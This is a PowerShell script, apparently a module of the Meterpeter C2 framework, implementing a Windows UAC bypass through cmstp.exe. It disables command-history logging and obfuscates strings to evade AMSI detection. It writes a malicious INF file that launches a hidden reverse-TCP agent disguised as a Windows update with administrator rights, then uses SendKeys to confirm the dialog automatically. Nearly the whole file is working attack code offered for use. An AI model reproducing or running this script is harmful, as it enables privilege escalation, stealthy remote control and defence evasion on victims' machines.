<#
.SYNOPSIS
   CMS`TP UAC Bypass POC using SendKeys!

   Author: @r00t-3xp10it
   Addapted from: @Oddvar_Moe
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: CMS`TP.exe {native}
   Optional Dependencies: CMSTPTrigger.ps1 {meterpeter}
   PS cmdlet Dev version: v1.0.5

.DESCRIPTION
   Cmdlet to Escalate Privileges from UserLand token to Administrator token.
   Borrowed from: '@Oddvar_Moe' and modified to evade AMS1 string detection.

.NOTES
   This cmdlet its an module of @Meterpeter C2 v2.10.11.15 release, that allow 
   meterpeter users to elevate session shell privileges. By default it executes
   Update-KB5005101.ps1 ( @Meterpeter rev tcp agent ) previous stored on %TMP%.
   To be abble to execute a diferent CmdLine edit 'Function script:Set-INFFile'
   [String]$CmdLine = "C:\absoluct\path\of\appl\to\execute.exe /c args" value.

.EXAMPLE
   PS C:\> .\UACBypassCMSTP.ps1
   Executes 'Update-KB5005101.ps1' with admin privs.

.INPUTS
   None. You cannot pipe objects into UACBypassCMSTP.ps1

.OUTPUTS
   Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
   -------  ------    -----      -----     ------     --  -- -----------
         7       2      416       1508       0,03  12756   6 cms`tp

   Process : cms`tp
   Hwnd    : 1901930
   
.LINK
   https://oddvar.moe/2017/08/15/research-on-cmstp-exe
   https://github.com/r00t-3xp10it/redpill/blob/main/bypass/UACBypassCMSTP.ps1   
   https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/CMSTPTrigger.ps1
   https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
#>


#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
$VulnBinObfusca = "$Env:WINDIR\Sys" + "te`m32\cm" + "stp.ex`e" -join ''
$FileNameObfusc = "$Env:TEMP\$RandomMe.inf" -join ''


Function script:Set-INFFile {

   [CmdletBinding()]
	   Param (
	   [Parameter(HelpMessage="Specify the INF file location")]
	   $InfFileLocation = "$FileNameObfusc",
	
	   [Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
	   [String]$CmdLine = "$PSHOME\powershell.exe -WindowStyle hidden -File $Env:TMP\Update-KB5005101.ps1"
   )


$InfContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Run Commands before setup begins to install
$CmdLine
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVpn"
ShortSvcName="CorpVpn"

"@

   #Write file on Disk
   $InfContent | Out-File $InfFileLocation -Encoding ASCII
}


Function Get-Hwnd {

   [CmdletBinding()]
     Param (
     [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
   )

   Process{
      $ErrorActionPreference = 'Stop'

      Try{
         $hwnd = Get-Process -Name "$ProcessName" | Select-Object -ExpandProperty MainWindowHandle
      }
      Catch 
      {
          $hwnd = $null
      }

      $hash = @{
         ProcessName = $ProcessName
         Hwnd        = $hwnd
      }

   #Stdout Table Object
   New-Object -TypeName PsObject -Property $hash
   }
}


Function Set-WindowActive {

   [CmdletBinding()]
      Param (
      [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
   )
  
  Process{
   $memberDefinition = @'
   [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
   [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

'@

   Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
   $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
   If($hwnd) 
   {
      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
      [User32.Api]::SetForegroundWindow($hwnd)|Out-Null #Supress 'True' in stdout
      [User32.Api]::ShowWindow($hwnd, 5)|Out-Null       #Supress 'True' in stdout
   }
   Else 
   {
      [string] $hwnd = 'N/A'
   }

   $hash = @{
      Process = $Name
      Hwnd    = $hwnd
   }

   #Stdout Table Object
   New-Object -TypeName PsObject -Property $hash
   }
}


. Set-INFFile
#Needs Windows forms
add-type -AssemblyName System.Windows.Forms
If(Test-Path $InfFileLocation)
{
   #Command to run
   $ps = New-Object System.Diagnostics.ProcessStartInfo "$VulnBinObfusca"
   $ps.Arguments = "/au $InfFileLocation"
   $ps.UseShellExecute = $false

   #Start it
   [System.Diagnostics.Process]::Start($ps)

   Do{
      #Do nothing until cms`tp is an active window
   }
   Until((Set-WindowActive cmstp).Hwnd -ne 0)

   #Activate window
   Set-WindowActive cmstp

   #Send the Enter key
   [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
}
exit